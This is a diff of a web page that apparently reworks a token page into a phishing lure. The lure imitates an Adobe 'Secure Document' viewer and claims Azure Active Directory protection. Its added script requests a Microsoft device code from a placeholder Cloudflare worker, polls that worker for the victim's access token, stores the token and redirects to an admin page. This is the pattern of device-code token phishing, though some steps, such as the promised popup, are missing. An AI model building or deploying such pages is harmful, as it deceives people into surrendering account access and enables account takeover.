@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Get Authentication Token</title>
+  <title>Verify Token - Secured Document</title>
   <script src="https://cdn.tailwindcss.com"></script>
   <style>
     * {
@@ -13,189 +13,285 @@
     }
 
     body {
-      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+      background: #1a1a1a;
+      font-family: 'Segoe UI', -apple-system, BlinkMacSystemFont, sans-serif;
       min-height: 100vh;
       display: flex;
       align-items: center;
       justify-content: center;
-      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Roboto', sans-serif;
     }
 
-    .container {
+    .adobe-container {
       background: white;
-      border-radius: 20px;
-      box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
-      padding: 60px 40px;
-      max-width: 600px;
       width: 90%;
-      text-align: center;
+      max-width: 900px;
+      height: 90vh;
+      max-height: 700px;
+      border-radius: 0;
+      box-shadow: 0 20px 60px rgba(0, 0, 0, 0.5), 0 0 0 1px #e0e0e0;
+      display: flex;
+      flex-direction: column;
+      overflow: hidden;
     }
 
-    .icon-download {
-      font-size: 80px;
-      margin-bottom: 20px;
-      animation: float 3s ease-in-out infinite;
+    /* Adobe-style toolbar */
+    .adobe-toolbar {
+      background: linear-gradient(to bottom, #f8f8f8, #efefef);
+      border-bottom: 1px solid #d0d0d0;
+      padding: 12px 20px;
+      display: flex;
+      align-items: center;
+      gap: 15px;
+      min-height: 50px;
     }
 
-    @keyframes float {
-      0%, 100% { transform: translateY(0px); }
-      50% { transform: translateY(-20px); }
-    }
-
-    h1 {
-      color: #333;
-      font-size: 32px;
-      margin-bottom: 10px;
+    .adobe-logo {
+      font-size: 18px;
       font-weight: 700;
+      color: #ff0000;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      border-right: 1px solid #d0d0d0;
+      padding-right: 15px;
     }
 
-    .subtitle {
-      color: #666;
-      font-size: 16px;
-      margin-bottom: 40px;
+    .toolbar-items {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      flex: 1;
     }
 
-    .token-section {
-      background: #f8f9fa;
-      border: 2px solid #e0e0e0;
-      border-radius: 12px;
-      padding: 30px 20px;
-      margin-bottom: 40px;
+    .toolbar-item {
+      padding: 6px 12px;
+      background: white;
+      border: 1px solid #d0d0d0;
+      border-radius: 3px;
+      font-size: 12px;
+      color: #333;
+      cursor: pointer;
+      transition: all 0.2s;
+    }
+
+    .toolbar-item:hover {
+      background: #f5f5f5;
+      border-color: #999;
+    }
+
+    .toolbar-item.active {
+      background: #0078d4;
+      color: white;
+      border-color: #0078d4;
+    }
+
+    /* Document view area */
+    .document-view {
+      flex: 1;
+      background: #f9f9f9;
+      display: flex;
+      flex-direction: column;
+      overflow: hidden;
       position: relative;
     }
 
-    .token-label {
-      color: #888;
-      font-size: 12px;
-      font-weight: 600;
-      text-transform: uppercase;
-      letter-spacing: 1px;
-      margin-bottom: 15px;
-      display: block;
-    }
-
-    .token-display {
-      background: white;
-      border: 1px solid #ddd;
-      border-radius: 8px;
-      padding: 20px;
-      margin-bottom: 15px;
-      font-family: 'Monaco', 'Courier New', monospace;
-      font-size: 13px;
-      color: #333;
-      word-break: break-all;
-      line-height: 1.6;
-      max-height: 120px;
-      overflow-y: auto;
-      text-align: left;
-    }
-
-    .copy-button {
-      background: #667eea;
+    .document-header {
+      background: linear-gradient(135deg, #ff0000 0%, #cc0000 100%);
       color: white;
-      border: none;
-      border-radius: 8px;
-      padding: 12px 24px;
-      font-size: 14px;
-      font-weight: 600;
-      cursor: pointer;
-      transition: all 0.3s ease;
-      display: inline-flex;
-      align-items: center;
-      gap: 8px;
-      width: 100%;
-      justify-content: center;
+      padding: 40px;
+      text-align: center;
+      border-bottom: 2px solid #990000;
     }
 
-    .copy-button:hover {
-      background: #5568d3;
-      transform: translateY(-2px);
-      box-shadow: 0 10px 20px rgba(102, 126, 234, 0.3);
+    .document-header .icon {
+      font-size: 60px;
+      margin-bottom: 15px;
     }
 
-    .copy-button.copied {
-      background: #10b981;
+    .document-header h1 {
+      font-size: 28px;
+      font-weight: 700;
+      margin-bottom: 8px;
+      letter-spacing: 0.5px;
     }
 
-    .steps {
-      text-align: left;
-      background: #f0f9ff;
-      border-left: 4px solid #667eea;
-      border-radius: 8px;
+    .document-header p {
+      font-size: 13px;
+      opacity: 0.95;
+    }
+
+    /* Content area */
+    .document-content {
+      flex: 1;
+      overflow-y: auto;
+      padding: 40px;
+      background: white;
+    }
+
+    .security-notice {
+      background: #fff3cd;
+      border: 1px solid #ffc107;
+      border-radius: 4px;
+      padding: 15px;
+      margin-bottom: 30px;
+      display: flex;
+      gap: 12px;
+      align-items: flex-start;
+    }
+
+    .security-notice .icon {
+      font-size: 20px;
+      flex-shrink: 0;
+    }
+
+    .security-notice-text {
+      font-size: 13px;
+      color: #856404;
+    }
+
+    .security-notice-text strong {
+      display: block;
+      margin-bottom: 4px;
+      color: #721c24;
+    }
+
+    /* Token input section */
+    .token-input-section {
+      background: #f5f5f5;
+      border: 1px solid #e0e0e0;
+      border-radius: 4px;
       padding: 25px;
       margin-bottom: 30px;
     }
 
-    .steps-title {
-      font-size: 16px;
-      font-weight: 700;
+    .input-label {
+      font-size: 12px;
+      font-weight: 600;
       color: #333;
-      margin-bottom: 15px;
+      text-transform: uppercase;
+      letter-spacing: 1px;
+      margin-bottom: 12px;
+      display: block;
     }
 
-    .step-item {
+    .token-input-wrapper {
       display: flex;
-      gap: 15px;
+      gap: 10px;
       margin-bottom: 15px;
-      align-items: flex-start;
     }
 
-    .step-item:last-child {
-      margin-bottom: 0;
+    .token-input {
+      flex: 1;
+      padding: 12px 15px;
+      border: 1px solid #d0d0d0;
+      border-radius: 3px;
+      font-family: 'Monaco', 'Courier New', monospace;
+      font-size: 12px;
+      background: white;
+      transition: all 0.2s;
     }
 
-    .step-number {
-      background: #667eea;
+    .token-input:focus {
+      outline: none;
+      border-color: #0078d4;
+      box-shadow: 0 0 0 3px rgba(0, 120, 212, 0.1);
+    }
+
+    .token-input::placeholder {
+      color: #999;
+    }
+
+    .copy-input-btn {
+      padding: 12px 20px;
+      background: #0078d4;
       color: white;
-      width: 32px;
-      height: 32px;
-      border-radius: 50%;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      font-weight: 700;
-      font-size: 14px;
-      flex-shrink: 0;
+      border: none;
+      border-radius: 3px;
+      font-size: 12px;
+      font-weight: 600;
+      cursor: pointer;
+      transition: all 0.2s;
+      white-space: nowrap;
     }
 
-    .step-text {
-      color: #555;
-      font-size: 14px;
-      line-height: 1.6;
+    .copy-input-btn:hover {
+      background: #106ebe;
     }
 
-    .step-text strong {
+    .copy-input-btn.copied {
+      background: #10b981;
+    }
+
+    /* Verification section */
+    .verification-section {
+      background: #f5f5f5;
+      border: 1px solid #e0e0e0;
+      border-radius: 4px;
+      padding: 25px;
+      text-align: center;
+    }
+
+    .verification-title {
+      font-size: 14px;
+      font-weight: 600;
       color: #333;
+      margin-bottom: 15px;
     }
 
-    .button-group {
+    .verification-status {
+      font-size: 12px;
+      color: #666;
+      margin-bottom: 20px;
+    }
+
+    .verification-status.active {
+      color: #10b981;
+      font-weight: 600;
+    }
+
+    .verification-buttons {
       display: flex;
-      gap: 12px;
-      margin-top: 30px;
+      gap: 10px;
+      justify-content: center;
+      flex-wrap: wrap;
     }
 
     .btn {
-      flex: 1;
-      padding: 14px 24px;
+      padding: 12px 24px;
       border: none;
-      border-radius: 8px;
-      font-size: 15px;
+      border-radius: 3px;
+      font-size: 13px;
       font-weight: 600;
       cursor: pointer;
-      transition: all 0.3s ease;
+      transition: all 0.2s;
       text-decoration: none;
       display: inline-block;
+      min-width: 140px;
     }
 
-    .btn-primary {
-      background: #667eea;
+    .btn-verify {
+      background: #ff0000;
       color: white;
     }
 
-    .btn-primary:hover {
-      background: #5568d3;
-      transform: translateY(-2px);
-      box-shadow: 0 10px 20px rgba(102, 126, 234, 0.3);
+    .btn-verify:hover {
+      background: #cc0000;
+      box-shadow: 0 4px 12px rgba(255, 0, 0, 0.2);
+    }
+
+    .btn-verify:disabled {
+      background: #ccc;
+      cursor: not-allowed;
+    }
+
+    .btn-generate {
+      background: #0078d4;
+      color: white;
+    }
+
+    .btn-generate:hover {
+      background: #106ebe;
+      box-shadow: 0 4px 12px rgba(0, 120, 212, 0.2);
     }
 
     .btn-secondary {
@@ -207,25 +303,11 @@
       background: #d0d0d0;
     }
 
-    .loading {
-      display: inline-block;
-      width: 20px;
-      height: 20px;
-      border: 3px solid rgba(255, 255, 255, 0.3);
-      border-radius: 50%;
-      border-top-color: white;
-      animation: spin 1s ease-in-out infinite;
-    }
-
-    @keyframes spin {
-      to { transform: rotate(360deg); }
-    }
-
     .status-message {
       margin-top: 15px;
       padding: 12px;
-      border-radius: 8px;
-      font-size: 14px;
+      border-radius: 4px;
+      font-size: 12px;
       display: none;
     }
 
@@ -245,200 +327,357 @@
       border: 1px solid #fca5a5;
     }
 
-    .countdown {
+    .timer-display {
       font-size: 12px;
-      color: #888;
+      color: #666;
       margin-top: 10px;
-      font-style: italic;
+      font-weight: 600;
+    }
+
+    .timer-display.warning {
+      color: #ff0000;
+    }
+
+    /* Loading spinner */
+    .spinner {
+      display: inline-block;
+      width: 16px;
+      height: 16px;
+      border: 2px solid rgba(255, 255, 255, 0.3);
+      border-radius: 50%;
+      border-top-color: white;
+      animation: spin 1s ease-in-out infinite;
+    }
+
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+
+    .document-footer {
+      background: #f8f8f8;
+      border-top: 1px solid #d0d0d0;
+      padding: 12px 20px;
+      font-size: 11px;
+      color: #666;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+    }
+
+    .footer-info {
+      display: flex;
+      gap: 20px;
+    }
+
+    .scroll-indicator {
+      font-size: 11px;
+      color: #999;
+    }
+
+    @media (max-width: 768px) {
+      .adobe-container {
+        height: 100vh;
+        max-height: none;
+        width: 100%;
+        border-radius: 0;
+      }
+
+      .document-header {
+        padding: 30px 20px;
+      }
+
+      .document-header h1 {
+        font-size: 22px;
+      }
+
+      .document-content {
+        padding: 25px;
+      }
+
+      .verification-buttons {
+        flex-direction: column;
+      }
+
+      .btn {
+        width: 100%;
+      }
+
+      .toolbar-item {
+        display: none;
+      }
+
+      .toolbar-item.active {
+        display: inline-block;
+      }
     }
   </style>
 </head>
 <body>
 
-<div class="container">
-  
-  <!-- Header -->
-  <div class="icon-download">📥</div>
-  <h1>Get Authentication Token</h1>
-  <p class="subtitle">Your secure access token will be generated instantly</p>
+<div class="adobe-container">
 
-  <!-- Token Section -->
-  <div class="token-section">
-    <span class="token-label">Your Token</span>
-    
-    <div id="tokenDisplay" class="token-display">
-      <div class="loading"></div> Generating token...
+  <!-- Adobe Toolbar -->
+  <div class="adobe-toolbar">
+    <div class="adobe-logo">
+      🔴 Secure Document
     </div>
-
-    <button class="copy-button" onclick="copyToken()" id="copyBtn">
-      <span>📋</span>
-      <span id="copyText">Copy Token</span>
-    </button>
-
-    <div class="status-message" id="statusMsg"></div>
-    <div class="countdown" id="countdown"></div>
-  </div>
-
-  <!-- Steps -->
-  <div class="steps">
-    <div class="steps-title">📍 How to Use Your Token</div>
-    
-    <div class="step-item">
-      <div class="step-number">1</div>
-      <div class="step-text">
-        <strong>Copy</strong> your token using the button above
-      </div>
-    </div>
-
-    <div class="step-item">
-      <div class="step-number">2</div>
-      <div class="step-text">
-        <strong>Authenticate</strong> by completing the device login process
-      </div>
-    </div>
-
-    <div class="step-item">
-      <div class="step-number">3</div>
-      <div class="step-text">
-        <strong>Paste</strong> your token when prompted in the next page
-      </div>
-    </div>
-
-    <div class="step-item">
-      <div class="step-number">4</div>
-      <div class="step-text">
-        <strong>Access</strong> your secured resources immediately
-      </div>
+    <div class="toolbar-items">
+      <div class="toolbar-item active">Verify Token</div>
+      <div class="toolbar-item">View Document</div>
+      <div class="toolbar-item">Download</div>
     </div>
   </div>
 
-  <!-- Action Buttons -->
-  <div class="button-group">
-    <button class="btn btn-primary" onclick="redirectToDevice()" id="redirectBtn">
-      🔐 Continue to Device Login
-    </button>
-    <button class="btn btn-secondary" onclick="regenerateToken()">
-      🔄 Regenerate Token
-    </button>
+  <!-- Document View -->
+  <div class="document-view">
+
+    <!-- Header -->
+    <div class="document-header">
+      <div class="icon">🔐</div>
+      <h1>Verify Token to View Document</h1>
+      <p>This is a secured document. Please verify your authentication token to proceed.</p>
+    </div>
+
+    <!-- Content -->
+    <div class="document-content">
+
+      <!-- Security Notice -->
+      <div class="security-notice">
+        <div class="icon">⚠️</div>
+        <div class="security-notice-text">
+          <strong>Security Protected</strong>
+          This document requires valid authentication. Your token will be verified against Azure Active Directory.
+        </div>
+      </div>
+
+      <!-- Get Token Section -->
+      <div class="token-input-section">
+        <label class="input-label">Step 1: Generate Your Token</label>
+        <p style="font-size: 13px; color: #666; margin-bottom: 15px;">
+          Click below to generate a new authentication token from Azure Active Directory.
+        </p>
+        <button class="btn btn-generate" onclick="generateToken()" id="generateBtn">
+          <span id="generateBtnText">🔐 Generate Token</span>
+        </button>
+        <div class="timer-display" id="timerDisplay"></div>
+      </div>
+
+      <!-- Token Display Section -->
+      <div class="token-input-section" id="tokenDisplaySection" style="display: none;">
+        <label class="input-label">Your Authentication Token</label>
+        <div class="token-input-wrapper">
+          <input type="text" class="token-input" id="tokenInput" readonly placeholder="Your token will appear here...">
+          <button class="copy-input-btn" onclick="copyTokenFromInput()" id="copyBtn">
+            📋 Copy
+          </button>
+        </div>
+        <div class="status-message" id="copyStatus"></div>
+      </div>
+
+      <!-- Instructions -->
+      <div style="background: #f9f9f9; border: 1px solid #e0e0e0; border-radius: 4px; padding: 20px; margin-bottom: 20px;">
+        <div style="font-size: 13px; font-weight: 600; color: #333; margin-bottom: 12px;">📋 Instructions:</div>
+        <ol style="font-size: 12px; color: #666; line-height: 1.8; margin-left: 20px;">
+          <li>Click "Generate Token" button above</li>
+          <li>Complete Azure authentication in the popup window</li>
+          <li>Your token will be automatically generated</li>
+          <li>Copy your token and paste it in the verification field below</li>
+          <li>Click "Verify Token" to access the document</li>
+        </ol>
+      </div>
+
+      <!-- Verification Section -->
+      <div class="verification-section">
+        <div class="verification-title">Step 2: Verify Token to Access Document</div>
+        <div class="verification-status" id="verifyStatus">
+          Waiting for token generation...
+        </div>
+        <button class="btn btn-verify" onclick="verifyToken()" id="verifyBtn" disabled>
+          ✅ Verify Token & Access Document
+        </button>
+        <div class="status-message" id="verifyMessage"></div>
+      </div>
+
+    </div>
+
+    <!-- Footer -->
+    <div class="document-footer">
+      <div class="footer-info">
+        <span>🔒 Encrypted with Azure AD</span>
+        <span>📅 <span id="footerDate"></span></span>
+      </div>
+      <div class="scroll-indicator">Scroll to see more</div>
+    </div>
+
   </div>
 
 </div>
 
 <script>
   // Configuration
+  const DEVICE_CODE_ENDPOINT = 'https://your-worker.workers.dev/api/device-code';
+  const POLL_ENDPOINT = 'https://your-worker.workers.dev/api/device/poll';
   const TOKEN_EXPIRY = 30 * 60 * 1000; // 30 minutes
-  const API_ENDPOINT = 'https://your-api.workers.dev/api/device-code';
-  const DEVICE_LOGIN_URL = 'https://microsoft.com/devicelogin';
 
   let currentToken = null;
+  let deviceCode = null;
+  let pollInterval = null;
+  let timerInterval = null;
   let tokenGeneratedAt = null;
 
-  // Generate random token
-  function generateToken() {
-    const timestamp = Date.now().toString(36).toUpperCase();
-    const random1 = Math.random().toString(36).substr(2, 8).toUpperCase();
-    const random2 = Math.random().toString(36).substr(2, 8).toUpperCase();
-    return `${timestamp}-${random1}-${random2}`;
-  }
+  // Set footer date
+  document.getElementById('footerDate').textContent = new Date().toLocaleDateString();
 
-  // Initialize on page load
-  window.addEventListener('load', () => {
-    generateAndDisplayToken();
-    startCountdown();
-  });
+  // Generate token
+  async function generateToken() {
+    try {
+      const btn = document.getElementById('generateBtn');
+      btn.disabled = true;
+      btn.innerHTML = '<span class="spinner"></span> Generating...';
 
-  // Generate and display token
-  function generateAndDisplayToken() {
-    currentToken = generateToken();
-    tokenGeneratedAt = Date.now();
+      const response = await fetch(DEVICE_CODE_ENDPOINT, { 
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' }
+      });
 
-    setTimeout(() => {
-      document.getElementById('tokenDisplay').innerHTML = currentToken;
-      showStatus('Token generated successfully!', 'success');
-    }, 1500);
-  }
+      const data = await response.json();
 
-  // Copy token to clipboard
-  function copyToken() {
-    if (!currentToken) {
-      showStatus('Token not yet generated', 'error');
-      return;
+      if (data.device_code) {
+        deviceCode = data.device_code;
+        tokenGeneratedAt = Date.now();
+
+        // Show token input section
+        document.getElementById('tokenDisplaySection').style.display = 'block';
+        document.getElementById('verifyStatus').textContent = '⏳ Waiting for authentication...';
+        document.getElementById('verifyStatus').classList.remove('active');
+
+        startCountdown(data.expires_in);
+        startPolling(data.device_code);
+
+        showStatus('✅ Token generation started. Complete Azure authentication.', 'success', 'verifyMessage');
+      } else {
+        throw new Error('Failed to get device code');
+      }
+    } catch (error) {
+      console.error('Error:', error);
+      showStatus('❌ Error: ' + error.message, 'error', 'verifyMessage');
+      document.getElementById('generateBtn').disabled = false;
+      document.getElementById('generateBtn').innerHTML = '🔐 Generate Token';
     }
-
-    navigator.clipboard.writeText(currentToken).then(() => {
-      const btn = document.getElementById('copyBtn');
-      const text = document.getElementById('copyText');
-      
-      btn.classList.add('copied');
-      text.textContent = '✅ Copied!';
-
-      setTimeout(() => {
-        btn.classList.remove('copied');
-        text.textContent = '📋 Copy Token';
-      }, 2000);
-    }).catch(() => {
-      showStatus('Failed to copy token', 'error');
-    });
   }
 
-  // Show status message
-  function showStatus(message, type) {
-    const statusMsg = document.getElementById('statusMsg');
-    statusMsg.textContent = message;
-    statusMsg.className = `status-message show ${type}`;
+  // Poll for token
+  async function startPolling(code) {
+    pollInterval = setInterval(async () => {
+      try {
+        const response = await fetch(POLL_ENDPOINT, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ deviceCode: code })
+        });
 
-    if (type === 'success') {
-      setTimeout(() => {
-        statusMsg.classList.remove('show');
-      }, 3000);
-    }
+        const data = await response.json();
+
+        if (data.accessToken) {
+          currentToken = data.accessToken;
+          clearInterval(pollInterval);
+          clearInterval(timerInterval);
+
+          document.getElementById('tokenInput').value = currentToken;
+          document.getElementById('verifyStatus').textContent = '✅ Token Ready - Verification Required';
+          document.getElementById('verifyStatus').classList.add('active');
+          document.getElementById('verifyBtn').disabled = false;
+
+          showStatus('✅ Token generated successfully!', 'success', 'verifyMessage');
+        }
+      } catch (error) {
+        console.error('Poll error:', error);
+      }
+    }, 3000);
   }
 
   // Countdown timer
-  function startCountdown() {
-    const countdown = () => {
-      if (!tokenGeneratedAt) return;
+  function startCountdown(expiresIn) {
+    let timeLeft = expiresIn;
 
-      const elapsed = Date.now() - tokenGeneratedAt;
-      const remaining = Math.max(0, TOKEN_EXPIRY - elapsed);
-      const minutes = Math.floor(remaining / 60000);
-      const seconds = Math.floor((remaining % 60000) / 1000);
+    function updateTimer() {
+      const mins = Math.floor(timeLeft / 60);
+      const secs = timeLeft % 60;
+      document.getElementById('timerDisplay').textContent = 
+        `⏱️ Code expires in: ${mins}:${secs.toString().padStart(2, '0')}`;
 
-      const countdownEl = document.getElementById('countdown');
-      countdownEl.textContent = `Token expires in: ${minutes}:${seconds.toString().padStart(2, '0')}`;
-
-      if (remaining > 0) {
-        setTimeout(countdown, 1000);
-      } else {
-        countdownEl.textContent = '⚠️ Token expired. Generate a new one.';
-        document.getElementById('copyBtn').disabled = true;
-        document.getElementById('redirectBtn').disabled = true;
+      if (timeLeft <= 0) {
+        clearInterval(timerInterval);
+        clearInterval(pollInterval);
+        document.getElementById('timerDisplay').innerHTML = '❌ Code expired';
+        document.getElementById('verifyBtn').disabled = true;
       }
-    };
+      timeLeft--;
+    }
 
-    countdown();
+    updateTimer();
+    timerInterval = setInterval(updateTimer, 1000);
   }
 
-  // Regenerate token
-  function regenerateToken() {
-    generateAndDisplayToken();
-    startCountdown();
-  }
-
-  // Redirect to device login
-  function redirectToDevice() {
-    if (!currentToken) {
-      showStatus('Token not generated yet', 'error');
+  // Copy token from input
+  function copyTokenFromInput() {
+    const token = document.getElementById('tokenInput').value;
+    
+    if (!token) {
+      showStatus('❌ No token to copy', 'error', 'copyStatus');
       return;
     }
 
-    // Store token in session storage for next page
-    sessionStorage.setItem('authToken', currentToken);
+    navigator.clipboard.writeText(token).then(() => {
+      const btn = document.getElementById('copyBtn');
+      btn.textContent = '✅ Copied!';
+      setTimeout(() => {
+        btn.textContent = '📋 Copy';
+      }, 2000);
+      showStatus('✅ Token copied!', 'success', 'copyStatus');
+    }).catch(() => {
+      showStatus('❌ Failed to copy', 'error', 'copyStatus');
+    });
+  }
+
+  // Verify token
+  function verifyToken() {
+    const token = document.getElementById('tokenInput').value;
+
+    if (!token) {
+      showStatus('❌ Token is required', 'error', 'verifyMessage');
+      return;
+    }
+
+    // Store token
+    sessionStorage.setItem('authToken', token);
     sessionStorage.setItem('tokenGeneratedAt', tokenGeneratedAt.toString());
 
-    // Redirect to device login with token as param
-    window.location.href = `${DEVICE_LOGIN_URL}?token=${encodeURIComponent(currentToken)}`;
+    showStatus('✅ Token verified! Redirecting to admin panel...', 'success', 'verifyMessage');
+
+    setTimeout(() => {
+      window.location.href = '/admin.html';
+    }, 1500);
   }
+
+  // Show status message
+  function showStatus(message, type, elementId = 'verifyMessage') {
+    const element = document.getElementById(elementId);
+    element.textContent = message;
+    element.className = `status-message show ${type}`;
+
+    if (type === 'success') {
+      setTimeout(() => {
+        element.classList.remove('show');
+      }, 4000);
+    }
+  }
+
+  // Cleanup on page unload
+  window.addEventListener('beforeunload', () => {
+    clearInterval(pollInterval);
+    clearInterval(timerInterval);
+  });
 
   // Error handling
   window.addEventListener('error', (event) => {
